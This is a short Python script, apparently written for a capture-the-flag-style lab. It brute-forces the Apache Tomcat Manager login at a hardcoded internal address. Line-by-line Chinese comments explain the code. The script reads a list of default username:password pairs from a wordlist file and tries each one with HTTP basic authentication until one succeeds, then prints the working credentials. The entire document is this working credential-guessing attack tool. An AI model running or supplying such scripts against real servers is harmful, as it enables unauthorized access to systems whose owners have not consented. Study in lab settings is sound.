#python3
import sys    #提供了许多函数和变量来处理Python运行时环境的不同部分sys方法

import requests  # 这是python的http库

with open('tomcat-betterdefaultpasslist.txt') as f:  # 打开字典文件
    for line in f:  # 字典里的每一行，开始循环
        dic = line.strip('\n').split(':')  # strip这个是删掉每行的换行符,  split(':') 是以：为分割。只显示出账号和密码，去掉他们中间的： 行成一个list
        url = 'http://10.10.10.95:8080/manager/html'  # 这是你要跑tom猫的地址。
        req = requests.get(url, auth=(dic[0], dic[1]))  # 进行http链接，代入url地址。auth是认证函数，dic是list，0和1就是取出第1位第二位。进行密码认证。
        if req.status_code == 200:  # 这是状态码的if判断，200是成功
            print('find it找到了：' + '\"' + line.strip('\n') + '\"')  # 找到后进行打印，line旁边的是双引号符号，line就是账号密码
            raise sys.exit()  # raise为抛出异常，错误的账号密码进行循环后，进入异常，然后执行sys.exit，是自动默默退出。从而避免报错，最后只显示正确的账号密码
